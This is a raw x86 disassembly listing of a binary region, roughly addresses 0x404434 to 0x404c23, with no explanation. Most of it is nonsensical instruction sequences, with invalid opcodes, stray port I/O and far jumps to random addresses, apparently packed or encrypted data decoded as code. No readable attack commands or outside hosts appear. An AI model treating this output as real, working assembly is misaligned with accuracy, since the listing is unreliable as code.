  404434:	push   cs
  404435:	call   0x8dee8db3
  40443a:	mov    ds:0x3d539d17,al
  40443f:	mov    DWORD PTR [edx-0x6d4a4848],esi
  404445:	cmp    al,BYTE PTR [ebx+0x1728969f]
  40444b:	cmp    eax,0x69a15812
  404450:	pop    ds
  404451:	clc    
  404452:	add    al,0x9c
  404454:	sbb    eax,0x74e0bd51
  404459:	adc    al,0xa0
  40445b:	fisttp WORD PTR ds:0x6e841034
  404461:	popa   
  404462:	and    eax,0x6c7e09b4
  404467:	and    BYTE PTR [ebp-0x4244d571],0x36
  40446e:	mov    dh,0x5b
  404470:	mov    eax,0x830810d4
  404475:	cmc    
  404476:	sub    dl,bh
  404478:	mov    bl,0x70
  40447a:	pop    es
  40447b:	mov    esi,0x3f9776d3
  404480:	mov    ch,0x85
  404482:	jg     0x404477
  404484:	push   edi
  404485:	dec    esp
  404486:	push   edx
  404487:	pop    eax
  404488:	sub    dh,al
  40448a:	sub    BYTE PTR [ecx-0x2618707],bl
  404490:	sub    esp,eax
  404492:	and    ecx,DWORD PTR ds:0x341c5a1a
  404498:	cmc    
  404499:	push   0x95f56871
  40449e:	aad    0x44
  4044a0:	inc    edi
  4044a1:	inc    edi
  4044a2:	fcmovbe st,st(6)
  4044a4:	leave  
  4044a5:	or     BYTE PTR [ecx-0x196dd155],ah
  4044ab:	clc    
  4044ac:	into   
  4044ad:	and    eax,0x6781183b
  4044b2:	fstp   st(4)
  4044b4:	sbb    DWORD PTR [ebp-0x32],0x441bb8aa
  4044bb:	test   al,0x6e
  4044bd:	xchg   edx,eax
  4044be:	stc    
  4044bf:	mov    al,ds:0xa62b020e
  4044c4:	aaa    
  4044c5:	cmp    ebx,DWORD PTR [ecx+edi*4-0x6c24041f]
  4044cc:	cwde   
  4044cd:	mov    BYTE PTR [eax-0x5101e8c],ah
  4044d3:	rol    dh,0x73
  4044d6:	jb     0x4044a1
  4044d8:	jnp    0x4044c4
  4044da:	jnp    0x4044c0
  4044dc:	xchg   ebp,eax
  4044dd:	mov    bl,0xd3
  4044df:	sub    al,0x20
  4044e1:	xlat   BYTE PTR ds:[ebx]
  4044e2:	sti    
  4044e3:	lods   eax,DWORD PTR ds:[esi]
  4044e4:	add    ch,ch
  4044e6:	in     eax,dx
  4044e7:	sbb    ebx,edx
  4044e9:	pop    es
  4044ea:	fwait
  4044eb:	out    dx,eax
  4044ec:	retf   
  4044ed:	sbb    BYTE PTR [ecx+ebp*8+0x1a],dl
  4044f1:	cmp    BYTE PTR [esi+0x2c],bl
  4044f4:	mov    bl,0x50
  4044f6:	stc    
  4044f7:	xlat   BYTE PTR ds:[ebx]
  4044f8:	pop    es
  4044f9:	fcom   DWORD PTR [eax+0x3f]
  4044fc:	into   
  4044fd:	xor    BYTE PTR [ebp+0x31ee71fc],ah
  404503:	rcl    DWORD PTR [edi-0x21],1
  404506:	fld    QWORD PTR [edi]
  404508:	push   edx
  404509:	mov    cl,0xdf
  40450b:	int3   
  40450c:	(bad)  
  40450d:	dec    esi
  40450e:	mov    ecx,gs
  404510:	adc    eax,0x1641561e
  404515:	xchg   ebp,eax
  404516:	pushf  
  404517:	xchg   ecx,eax
  404518:	push   esi
  404519:	sub    DWORD PTR [ebp+esi*2+0x6560ec03],ebx
  404520:	cmp    BYTE PTR [ebp+0x3e],0x8c
  404524:	xchg   esp,eax
  404525:	sbb    esp,DWORD PTR [eax]
  404527:	jle    0x4044f0
  404529:	test   cl,ah
  40452b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40452c:	mov    ebx,0xb2aa9db2
  404531:	popf   
  404532:	xchg   ecx,eax
  404533:	clc    
  404534:	dec    edx
  404535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404536:	push   0xffffffab
  404538:	hlt    
  404539:	retf   0x1a78
  40453c:	mov    dl,0xc2
  40453e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453f:	adc    esi,DWORD PTR [eax]
  404541:	pop    es
  404542:	loope  0x4045a8
  404544:	mov    ebx,0x33007d5a
  404549:	test   bl,0x45
  40454c:	jmp    0xe5077534
  404551:	jle    0x4044e6
  404553:	das    
  404554:	outs   dx,BYTE PTR ds:[esi]
  404555:	inc    edi
  404556:	lds    edi,FWORD PTR [ecx-0x32cf759a]
  40455c:	jbe    0x4045ba
  40455e:	div    DWORD PTR [edi-0x4032f0f0]
  404564:	or     DWORD PTR [esi+0x9],edi
  404567:	xchg   ecx,eax
  404568:	push   ds
  404569:	sub    al,0xbe
  40456b:	call   0x2934:0x9ecae50e
  404572:	es xor bl,bl
  404575:	das    
  404576:	aas    
  404577:	sbb    BYTE PTR [ecx],bl
  404579:	pusha  
  40457a:	cld    
  40457b:	push   edx
  40457c:	fsub   QWORD PTR ss:[ecx]
  40457f:	push   ds
  404580:	sub    bp,WORD PTR [edx+0x78]
  404584:	lahf   
  404585:	jg     0x404520
  404587:	pop    esi
  404588:	push   esi
  404589:	push   cs
  40458a:	data16 sub al,0x17
  40458d:	or     esi,DWORD PTR ds:0x9af5ae73
  404593:	xchg   ebp,eax
  404594:	in     eax,0xfa
  404596:	nop
  404597:	or     bl,BYTE PTR [edi]
  404599:	and    eax,ebp
  40459b:	jg     0x4045fd
  40459d:	push   eax
  40459e:	pop    ecx
  40459f:	pmulhuw mm6,QWORD PTR [ebx]
  4045a2:	and    ebp,DWORD PTR [eax]
  4045a4:	jae    0x404619
  4045a6:	or     esp,DWORD PTR [esi+0x30094bbb]
  4045ac:	adc    dl,BYTE PTR [edi+0x59]
  4045af:	push   ds
  4045b0:	dec    ebx
  4045b1:	cwde   
  4045b2:	and    esp,DWORD PTR [eax+0xc486841]
  4045b8:	sbb    ecx,DWORD PTR [edx]
  4045ba:	xor    eax,0x373d74c3
  4045bf:	jl     0x40457e
  4045c1:	adc    ebp,DWORD PTR [ecx-0x47]
  4045c4:	sbb    eax,0x1f775fef
  4045c9:	imul   DWORD PTR [esi]
  4045cb:	stos   BYTE PTR es:[edi],al
  4045cc:	inc    ecx
  4045cd:	aam    0x77
  4045cf:	rcr    esp,cl
  4045d1:	dec    edi
  4045d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d3:	adc    DWORD PTR [esi+0x24],esi
  4045d6:	pop    ebx
  4045d7:	lods   al,BYTE PTR ds:[esi]
  4045d8:	xor    eax,0x380bf0ac
  4045dd:	pop    edi
  4045de:	push   ebp
  4045df:	dec    esi
  4045e0:	push   ebx
  4045e1:	jmp    0x8d:0x9765c033
  4045e8:	or     bl,BYTE PTR [edi]
  4045ea:	clc    
  4045eb:	mov    eax,DWORD PTR [eax-0x6f]
  4045ee:	ret    
  4045ef:	sbb    eax,0xd7750edf
  4045f4:	pop    es
  4045f5:	loopne 0x404608
  4045f7:	jg     0x404612
  4045f9:	(bad)  
  4045fa:	push   esi
  4045fb:	(bad)  
  4045fd:	push   0xbfdf2689
  404602:	stos   DWORD PTR es:[edi],eax
  404603:	mov    eax,ds:0xceb3b84f
  404608:	(bad)  
  404609:	cmp    BYTE PTR [edi],dh
  40460b:	jmp    0xff15:0xee8ded75
  404612:	fisttp WORD PTR [ecx]
  404614:	fdiv   st,st(3)
  404616:	sub    al,0x36
  404618:	add    DWORD PTR [ecx+eax*2-0x1457b511],esp
  40461f:	add    esp,DWORD PTR [eax-0x1b62879e]
  404625:	pusha  
  404626:	lea    edi,[eax]
  404628:	xchg   esp,eax
  404629:	jge    0x4045e9
  40462b:	(bad)  
  40462c:	lock fld QWORD PTR ds:0xcc1dca08
  404633:	ja     0x4046a8
  404635:	sar    DWORD PTR fs:[ebx-0x20],cl
  404639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40463a:	and    eax,0x9b57185
  40463f:	gs push 0xffffff80
  404642:	jge    0x4045ed
  404644:	push   0xffffffe3
  404646:	iret   
  404647:	hlt    
  404648:	xchg   esi,eax
  404649:	and    al,0x21
  40464b:	aas    
  40464c:	push   eax
  40464d:	loopne 0x40468a
  40464f:	lock sbb BYTE PTR [esi],ah
  404652:	mov    ecx,0xbe027fa9
  404657:	sbb    ch,BYTE PTR [eax+esi*8-0x70]
  40465b:	jp     0x4046bb
  40465d:	dec    ecx
  40465e:	out    0x1c,eax
  404660:	xchg   ebx,eax
  404661:	jge    0x404673
  404663:	ss inc edx
  404665:	cmp    eax,0xe1937529
  40466a:	cdq    
  40466b:	ficom  DWORD PTR [eax+0x38f8b400]
  404671:	retf   0x3432
  404674:	push   ebx
  404675:	jmp    0xc1ea465b
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	cmp    al,0xb7
  40467d:	mov    al,ds:0x27e7cb29
  404682:	add    DWORD PTR [ebx+0x15b811d0],ecx
  404688:	sbb    eax,0x7398cbd5
  40468d:	inc    edi
  40468e:	pop    esi
  40468f:	imul   edi,esp,0x2a1d2ac4
  404695:	add    bl,al
  404697:	cmp    al,0xcf
  404699:	dec    eax
  40469a:	xchg   esp,eax
  40469b:	lds    esi,FWORD PTR [ebp-0x2ffe3a90]
  4046a1:	stos   DWORD PTR es:[edi],eax
  4046a2:	ins    BYTE PTR es:[edi],dx
  4046a3:	cld    
  4046a4:	loop   0x404627
  4046a6:	addr16 xchg esi,eax
  4046a8:	div    BYTE PTR [edi+ebp*8]
  4046ab:	retf   
  4046ac:	dec    ecx
  4046ad:	cmp    al,0x26
  4046af:	xchg   edx,eax
  4046b0:	sbb    cl,dl
  4046b2:	cmp    ebx,esi
  4046b4:	sub    BYTE PTR [esi],0xb7
  4046b7:	adc    eax,0xce52b000
  4046bc:	mov    BYTE PTR [edi-0x47],dh
  4046bf:	lahf   
  4046c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c1:	inc    eax
  4046c2:	or     BYTE PTR [ebx+0x20],0x5
  4046c6:	(bad)  
  4046c7:	repz gs sub eax,0x3af172fd
  4046ce:	xor    cl,BYTE PTR [ebp+0x7c0dff5a]
  4046d4:	out    dx,eax
  4046d5:	push   ebx
  4046d6:	push   ebp
  4046d7:	adc    ecx,ecx
  4046d9:	ret    0x7105
  4046dc:	lods   eax,DWORD PTR ds:[esi]
  4046dd:	add    cl,cl
  4046df:	add    al,BYTE PTR gs:[ecx+0x422dee5f]
  4046e6:	pop    ebx
  4046e7:	lods   eax,DWORD PTR ds:[esi]
  4046e8:	xchg   ebx,eax
  4046e9:	std    
  4046ea:	pop    eax
  4046eb:	gs cmp eax,0xc6a1c25b
  4046f1:	js     0x4046ab
  4046f3:	(bad)  
  4046f4:	push   eax
  4046f5:	sub    DWORD PTR ds:0x95a49f25,0xffffffd9
  4046fc:	daa    
  4046fd:	ins    DWORD PTR es:[edi],dx
  4046fe:	dec    edi
  4046ff:	and    BYTE PTR [esi-0x45b9497b],ah
  404705:	scas   al,BYTE PTR es:[edi]
  404706:	cmp    dh,BYTE PTR [edx]
  404708:	inc    edi
  404709:	dec    esp
  40470a:	add    al,0xe3
  40470c:	adc    al,0x6e
  40470e:	out    dx,al
  40470f:	mov    esp,0x8b4b6abb
  404714:	ins    DWORD PTR es:[edi],dx
  404715:	pop    ds
  404716:	in     eax,dx
  404717:	or     DWORD PTR [ebp-0x79],eax
  40471a:	fwait
  40471b:	stos   BYTE PTR es:[edi],al
  40471c:	out    0x57,al
  40471e:	dec    edi
  40471f:	mov    eax,ds:0x84109800
  404724:	out    0xb2,eax
  404726:	(bad)
  404729:	aaa    
  40472a:	dec    esp
  40472b:	(bad)
  40472e:	mov    ebp,edi
  404730:	cmc    
  404731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404732:	es xchg ecx,eax
  404734:	pop    edx
  404735:	out    dx,eax
  404736:	pop    si
  404738:	sub    BYTE PTR [eax],al
  40473a:	and    eax,0xd1ac0f67
  40473f:	add    al,BYTE PTR [ecx+0x4282f30d]
  404745:	add    BYTE PTR [edi-0x3effbd7e],ch
  40474b:	jmp    0x4282:0xcf158b02
  404752:	add    BYTE PTR [ecx],cl
  404754:	adc    eax,0x4283cf
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0x7cc564c0
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    bh,bl
  40477a:	xor    BYTE PTR [esi+0x4720aee0],bh
  404780:	and    DWORD PTR [edi+0x32d49910],edx
  404786:	push   ds
  404787:	jae    0x40475e
  404789:	cmp    BYTE PTR [esp+edx*8],al
  40478c:	mov    esp,0x12cecd49
  404791:	pop    ss
  404792:	dec    ecx
  404793:	sbb    edx,edi
  404795:	sahf   
  404796:	div    dh
  404798:	sbb    edx,esp
  40479a:	iret   
  40479b:	adc    DWORD PTR [ecx],0x583f2408
  4047a1:	xor    BYTE PTR [eax-0x54],bh
  4047a4:	xchg   BYTE PTR [ebp*1+0x2e042459],ch
  4047ab:	mov    DWORD PTR [eax-0x63ce9508],eax
  4047b1:	jmp    0x76039ee9
  4047b6:	xchg   BYTE PTR [edi],bl
  4047b8:	data16 jnp 0x40482b
  4047bb:	mov    ch,0xdd
  4047bd:	push   sp
  4047bf:	mov    ebx,0x8de19fcb
  4047c4:	ss ins DWORD PTR es:[edi],dx
  4047c6:	pop    edi
  4047c7:	dec    esi
  4047c8:	mov    cs,ebp
  4047ca:	xlat   BYTE PTR ds:[ebx]
  4047cb:	xor    ecx,DWORD PTR [edx-0x2cfcfea6]
  4047d1:	fabs   
  4047d3:	in     eax,dx
  4047d4:	jmp    0xaf4a:0x52f44ea8
  4047db:	dec    edi
  4047dc:	pushf  
  4047dd:	mov    edi,0x69285de4
  4047e2:	sub    eax,0xc8d341fb
  4047e7:	jge    0x404800
  4047e9:	fsub   QWORD PTR [edi+eax*1]
  4047ec:	xchg   esp,eax
  4047ed:	(bad)  
  4047ee:	and    bh,0xd5
  4047f1:	mov    WORD PTR [edi+0x49],bp
  4047f5:	push   ebx
  4047f6:	outs   dx,BYTE PTR ds:[esi]
  4047f7:	and    DWORD PTR [edx-0x640fa991],0xffffffdc
  4047fe:	sahf   
  4047ff:	mov    edi,0x6131f1f5
  404804:	ficomp DWORD PTR [eax]
  404806:	sub    eax,0xecbc312c
  40480b:	push   ebp
  40480c:	mov    es,WORD PTR [eax+0x39a4bd5d]
  404812:	inc    eax
  404813:	popa   
  404814:	mov    ecx,0x21fc6015
  404819:	pop    ss
  40481a:	inc    ebp
  40481b:	wbinvd 
  40481d:	push   ds
  40481e:	sar    DWORD PTR [ebp-0x32d356b4],cl
  404824:	cmp    DWORD PTR [edi+eax*8],ebx
  404827:	mov    ?,WORD PTR [ebp+0x2a]
  40482a:	and    BYTE PTR [esi+edi*1+0xd],dl
  40482e:	push   eax
  40482f:	xchg   BYTE PTR [esi-0x7153918b],dl
  404835:	push   esp
  404836:	fisttp QWORD PTR cs:[ecx]
  404839:	out    dx,al
  40483a:	push   esi
  40483b:	scas   eax,DWORD PTR es:[edi]
  40483c:	dec    edx
  40483d:	adc    esi,edx
  40483f:	inc    edx
  404840:	aas    
  404841:	rcr    BYTE PTR [ebp-0x4556036b],cl
  404847:	dec    ecx
  404848:	add    ecx,DWORD PTR [ebx]
  40484a:	dec    edi
  40484b:	cmp    al,ch
  40484d:	in     eax,dx
  40484e:	cmp    DWORD PTR [eax+0x30deb78b],edi
  404854:	sbb    eax,0xc6502186
  404859:	out    0x1f,eax
  40485b:	and    BYTE PTR [ecx+0x42],ch
  40485e:	test   eax,0x30ac0806
  404863:	or     al,0xe0
  404865:	outs   dx,BYTE PTR ds:[esi]
  404866:	pop    esp
  404867:	add    esi,eax
  404869:	mov    BYTE PTR [eax+0x2d],bh
  40486c:	mov    esp,0xb111d0db
  404871:	mov    WORD PTR [eax],gs
  404873:	pusha  
  404874:	dec    edi
  404875:	ret    
  404876:	adc    eax,0x8fe3e8c8
  40487b:	xchg   edi,eax
  40487c:	cmp    eax,0xf1733587
  404881:	mov    esi,eax
  404883:	inc    ebp
  404884:	sbb    ah,cl
  404886:	(bad)
  404889:	mov    dh,0xbf
  40488b:	test   al,0x92
  40488d:	lock sub eax,0x71ce6287
  404893:	jnp    0x404876
  404895:	fcomp  DWORD PTR [edx+0x12e26231]
  40489b:	fcmovnbe st,st(6)
  40489d:	sub    DWORD PTR ds:0x13b2ef01,ebx
  4048a3:	mov    ah,0x38
  4048a5:	repnz out dx,eax
  4048a7:	and    al,0x20
  4048a9:	jno    0x404833
  4048ab:	push   edx
  4048ac:	jle    0x404840
  4048ae:	(bad)  
  4048af:	push   ds
  4048b0:	mov    ds:0xe8d27596,al
  4048b5:	mov    bl,0x68
  4048b7:	mov    al,ds:0x3a927f44
  4048bc:	shl    BYTE PTR [esp+eax*1+0x40f60998],0xf
  4048c4:	jl     0x404922
  4048c6:	enter  0x9e25,0x30
  4048ca:	imul   esi,DWORD PTR [ecx-0x57],0x41
  4048ce:	xchg   edx,eax
  4048cf:	add    ebp,esi
  4048d1:	mov    eax,0xf33cd919
  4048d6:	mov    al,ds:0xe1489b10
  4048db:	out    dx,eax
  4048dc:	cmp    esi,esi
  4048de:	pop    eax
  4048df:	mov    ch,0x26
  4048e1:	and    ebp,edx
  4048e3:	adc    eax,0xb5ffc28f
  4048e8:	cmp    BYTE PTR [edx-0x3695d460],ah
  4048ee:	test   BYTE PTR [edx+0x1d],bh
  4048f1:	dec    edx
  4048f2:	mov    dh,0xf2
  4048f4:	popf   
  4048f5:	aas    
  4048f6:	mov    esi,0xfa42391d
  4048fb:	push   edx
  4048fc:	pop    esi
  4048fd:	mov    ds:0xc8b431e2,al
  404902:	jmp    0xaa99a884
  404907:	sbb    ah,bh
  404909:	lods   al,BYTE PTR ds:[esi]
  40490a:	push   ebx
  40490b:	les    ebx,FWORD PTR [ecx+edi*4]
  40490e:	popa   
  40490f:	sar    BYTE PTR [edi-0x5f861766],cl
  404915:	call   0x5ccc:0x929868cb
  40491c:	gs jg  0x404965
  40491f:	out    dx,al
  404920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404921:	int    0x81
  404923:	and    BYTE PTR [eax],dh
  404925:	in     al,dx
  404926:	sbb    al,BYTE PTR [ebx-0x46]
  404929:	push   ecx
  40492a:	or     BYTE PTR [edi-0x63daa895],dh
  404930:	lock out 0xe8,al
  404933:	adc    BYTE PTR [ecx],dh
  404935:	dec    esi
  404936:	dec    edi
  404937:	add    esp,edx
  404939:	inc    edx
  40493a:	sbb    edx,DWORD PTR [ebx-0x1e4b0e8d]
  404940:	xor    DWORD PTR [edi-0x64c9c223],esp
  404946:	ret    
  404947:	inc    edx
  404948:	outs   dx,DWORD PTR ds:[esi]
  404949:	mov    ebp,0x14729157
  40494e:	add    eax,0x1c8c382a
  404953:	jnp    0x40499d
  404955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404956:	sbb    ecx,eax
  404958:	sti    
  404959:	fisub  DWORD PTR [ecx-0x27]
  40495c:	adc    cl,BYTE PTR ds:0x7d7eecad
  404962:	sbb    dh,BYTE PTR [edx-0x51]
  404965:	push   ss
  404966:	fstp   QWORD PTR [eax-0x2]
  404969:	xor    esi,esi
  40496b:	or     BYTE PTR [edx],dh
  40496d:	(bad)  
  40496e:	imul   ebp,DWORD PTR [ebx],0x21
  404971:	loop   0x404974
  404973:	jae    0x40496b
  404975:	sbb    esp,DWORD PTR [ecx+edx*4+0x1b]
  404979:	popa   
  40497a:	mov    ah,0xfe
  40497c:	push   edi
  40497d:	popa   
  40497e:	xchg   ebp,eax
  40497f:	jo     0x4049e2
  404981:	je     0x404964
  404983:	sub    DWORD PTR [eax-0x48b59a53],ecx
  404989:	pop    ds
  40498a:	(bad)  [ebp+0x3c95ea1b]
  404991:	(bad)  ds:0x52c5328f
  404997:	fdivr  QWORD PTR [eax]
  404999:	sub    dh,BYTE PTR [edx+ebx*4-0x24]
  40499d:	dec    esi
  40499e:	fisttp QWORD PTR [esi]
  4049a0:	into   
  4049a1:	daa    
  4049a2:	call   DWORD PTR [esi+0x4230bb12]
  4049a8:	or     eax,0x19bdd9b6
  4049ad:	mov    edx,0x8ed5b263
  4049b2:	mov    esp,0xfb15e046
  4049b7:	das    
  4049b8:	sbb    BYTE PTR [ebx],bl
  4049ba:	fst    DWORD PTR [ecx-0x7c]
  4049bd:	data16 sub BYTE PTR [ecx],dl
  4049c0:	cli    
  4049c1:	sub    ch,BYTE PTR [ebx+0x5610af62]
  4049c7:	add    edi,esp
  4049c9:	xor    dh,BYTE PTR [ebx+eiz*4]
  4049cc:	scas   al,BYTE PTR es:[edi]
  4049cd:	(bad)  
  4049ce:	xchg   edx,eax
  4049cf:	sub    eax,0x4d3200d4
  4049d4:	cwde   
  4049d5:	out    dx,eax
  4049d6:	add    dl,BYTE PTR [edx-0x6608736a]
  4049dc:	jno    0x404a46
  4049de:	adc    DWORD PTR [edi+0x5bcc23d6],ebp
  4049e4:	xchg   ebp,eax
  4049e5:	mov    BYTE PTR [ebx-0x6c06a5dd],ch
  4049eb:	cmc    
  4049ec:	push   ebp
  4049ed:	daa    
  4049ee:	mov    dl,0xc5
  4049f0:	shr    DWORD PTR [esi-0x35],1
  4049f3:	or     eax,0x1fb5d17d
  4049f8:	cdq    
  4049f9:	popa   
  4049fa:	xchg   edi,eax
  4049fb:	mov    ecx,ebp
  4049fd:	test   BYTE PTR [ebx+ebp*4+0x8645],0x38
  404a05:	loop   0x4049c8
  404a07:	push   DWORD PTR [ecx]
  404a09:	or     al,0x17
  404a0b:	loopne 0x4049a1
  404a0d:	xchg   esi,eax
  404a0e:	imul   edx,DWORD PTR [esi-0x48f21772],0xffffffb0
  404a15:	(bad)  
  404a16:	mov    ch,0xab
  404a18:	lods   al,BYTE PTR ds:[esi]
  404a19:	int3   
  404a1a:	pop    ds
  404a1b:	ret    
  404a1c:	repnz out 0xc0,eax
  404a1f:	jae    0x4049e6
  404a21:	jae    0x4049a9
  404a23:	test   al,0x18
  404a25:	cmp    eax,0x49df4a45
  404a2a:	cld    
  404a2b:	cmp    BYTE PTR [ebp-0x7dd2ff60],ch
  404a31:	sub    dl,bl
  404a33:	mov    eax,0xc1c2d34f
  404a38:	and    DWORD PTR [ebx+0x45],0xe2128819
  404a3f:	in     eax,dx
  404a40:	mov    ebp,0xaffd83b8
  404a45:	(bad)  
  404a46:	sti    
  404a47:	pcmpeqd mm1,mm7
  404a4a:	clc    
  404a4b:	(bad)
  404a4e:	cmp    eax,0x4a787941
  404a53:	cmp    ecx,DWORD PTR [edi+ebp*2+0x3402fbf7]
  404a5a:	inc    ebx
  404a5b:	mov    ebx,0x9a01129e
  404a60:	inc    ecx
  404a61:	stos   BYTE PTR es:[edi],al
  404a62:	jns    0x404ad5
  404a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a65:	clc    
  404a66:	xchg   edx,eax
  404a67:	or     BYTE PTR [ebp+0x27ad914e],bh
  404a6d:	ds cld 
  404a6f:	imul   DWORD PTR [eax+0x34]
  404a72:	ret    0xdc9
  404a75:	mov    BYTE PTR [eax-0x74c2dec0],0x9b
  404a7c:	cmp    BYTE PTR [esi],ah
  404a7e:	or     BYTE PTR [ecx-0x29abeb4c],dl
  404a84:	scas   eax,DWORD PTR es:[edi]
  404a85:	ror    bh,0xa4
  404a88:	dec    edx
  404a89:	mov    edi,0xcba3f64f
  404a8e:	fstp   DWORD PTR [ecx+edi*4]
  404a91:	mov    eax,ds:0xa45ddb0
  404a96:	mov    ah,0xb4
  404a98:	das    
  404a99:	push   eax
  404a9a:	add    al,0x84
  404a9c:	jbe    0x404a96
  404a9e:	xchg   ecx,eax
  404a9f:	sub    BYTE PTR [edi],ah
  404aa1:	xor    al,0x6d
  404aa3:	jns    0x404b0b
  404aa5:	or     ah,BYTE PTR [eax-0x5334d96b]
  404aab:	adc    ah,0xd3
  404aae:	xchg   esp,eax
  404aaf:	pop    edi
  404ab0:	repz xchg ebx,eax
  404ab2:	mov    ecx,esi
  404ab4:	jl     0x404aac
  404ab6:	and    eax,DWORD PTR [ecx-0x30]
  404ab9:	daa    
  404aba:	out    dx,eax
  404abb:	push   esp
  404abc:	ret    0x880c
  404abf:	cmp    dh,BYTE PTR [esi+ecx*8+0x3b170f42]
  404ac6:	mov    ah,0x73
  404ac8:	lock mov BYTE PTR [eax+esi*8-0x7f],al
  404acd:	loopne 0x404b32
  404acf:	stos   BYTE PTR es:[edi],al
  404ad0:	jl     0x404a58
  404ad2:	outs   dx,DWORD PTR ds:[esi]
  404ad3:	add    BYTE PTR [ebx-0x20f248ab],bl
  404ad9:	out    0x41,eax
  404adb:	bound  eax,QWORD PTR [esi]
  404add:	or     edi,DWORD PTR ds:0x49d8a6a3
  404ae3:	lea    edi,[ebp+ebp*1+0x3e]
  404ae7:	add    BYTE PTR [esi-0x2334741b],ch
  404aed:	mov    ds:0x47dd2d00,al
  404af2:	push   ebp
  404af3:	(bad)  
  404af4:	jge    0x404b58
  404af6:	xor    dh,bh
  404af8:	sub    bh,dl
  404afa:	lods   al,BYTE PTR ds:[esi]
  404afb:	add    bl,BYTE PTR [ebx]
  404afd:	pop    edx
  404afe:	inc    ebp
  404aff:	jae    0x404aef
  404b01:	ins    BYTE PTR es:[edi],dx
  404b02:	repnz lods eax,DWORD PTR ds:[esi]
  404b04:	test   ecx,ebx
  404b06:	jne    0x404aff
  404b08:	mov    ebx,0x2b76ff88
  404b0d:	xchg   ch,cl
  404b0f:	sbb    DWORD PTR [ebx+0x3],edx
  404b12:	push   ds
  404b13:	fwait
  404b14:	push   esi
  404b15:	jmp    0x33bf:0xac3c4f66
  404b1c:	cwde   
  404b1d:	nop
  404b1e:	mov    ecx,0x3839bb16
  404b23:	(bad)
  404b27:	fs in  eax,0xe4
  404b2a:	iret   
  404b2b:	jecxz  0x404b9b
  404b2d:	lea    ebp,[esi+0x684d587d]
  404b33:	adc    dh,BYTE PTR [ebp+0x31]
  404b36:	loope  0x404aeb
  404b38:	sub    cl,cl
  404b3a:	mov    ecx,DWORD PTR [ebx]
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x4282e3,0x428357
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	ds cmp eax,0xc1606a37
  404b65:	sbb    BYTE PTR [eax],bl
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    bh,ah
  404b6c:	iret   
  404b6d:	xchg   edx,eax
  404b6e:	es cmc 
  404b70:	lods   eax,DWORD PTR ds:[esi]
  404b71:	test   BYTE PTR [esi],0x63
  404b74:	xchg   esp,eax
  404b75:	xchg   esi,eax
  404b76:	aaa    
  404b77:	sbb    DWORD PTR [edx-0x16a7ee38],ebx
  404b7d:	cmc    
  404b7e:	jbe    0x404bf9
  404b80:	mov    eax,0x9a755423
  404b85:	(bad)  
  404b86:	mov    ds:0x84f30f4b,eax
  404b8b:	and    al,0xca
  404b8d:	js     0x404c0b
  404b8f:	fs and al,0x44
  404b92:	loope  0x404bf3
  404b94:	das    
  404b95:	adc    ah,BYTE PTR [esi]
  404b97:	xor    DWORD PTR [ebp-0x1731cc5],eax
  404b9d:	arpl   WORD PTR [ebx-0x4c],bp
  404ba0:	fisttp QWORD PTR [ecx+ebp*4+0x7d64dd75]
  404ba7:	inc    edi
  404ba8:	int    0xf8
  404baa:	xor    ecx,ecx
  404bac:	and    BYTE PTR [ebx-0x2c],dl
  404baf:	or     eax,0xdbb47d21
  404bb4:	jmp    0x404bbe
  404bb6:	adc    ch,al
  404bb8:	sti    
  404bb9:	mov    WORD PTR [esi+0xa],ss
  404bbc:	adc    DWORD PTR [edx+ebp*2],0x36
  404bc0:	in     eax,0x6a
  404bc2:	ss test edi,esp
  404bc5:	push   ecx
  404bc6:	adc    cl,bh
  404bc8:	dec    edx
  404bc9:	cmp    ah,ah
  404bcb:	pop    esi
  404bcc:	dec    ebx
  404bcd:	add    al,BYTE PTR ds:0xba7d492c
  404bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd4:	fiadd  WORD PTR [esi-0x1b]
  404bd7:	dec    ebp
  404bd8:	cwde   
  404bd9:	cmp    bh,BYTE PTR [edi]
  404bdb:	fbld   TBYTE PTR [eax-0x1c152d03]
  404be1:	mov    edx,DWORD PTR [edi-0x5469c563]
  404be7:	xchg   esp,eax
  404be8:	mov    edx,0xc91c85cd
  404bed:	pop    ecx
  404bee:	mov    WORD PTR [edx-0x15],fs
  404bf1:	sahf   
  404bf2:	or     DWORD PTR [edx+0x40],eax
  404bf5:	imul   ecx,DWORD PTR [esi-0x1107b35c],0x30
  404bfc:	pop    esi
  404bfd:	and    eax,0xeee9ecf5
  404c02:	popa   
  404c03:	cmp    esi,DWORD PTR [eax]
  404c05:	mov    eax,0x2df8db1f
  404c0a:	push   ss
  404c0b:	shl    DWORD PTR [edi+0x7c],cl
  404c0e:	gs mov eax,es
  404c11:	mov    eax,ds:0xf805472
  404c16:	mov    ebp,0x66ad0a21
  404c1b:	dec    esp
  404c1c:	mov    DWORD PTR [ecx+0x4fb32268],edx
  404c22:	push   ebx
  404c23:	icebp  
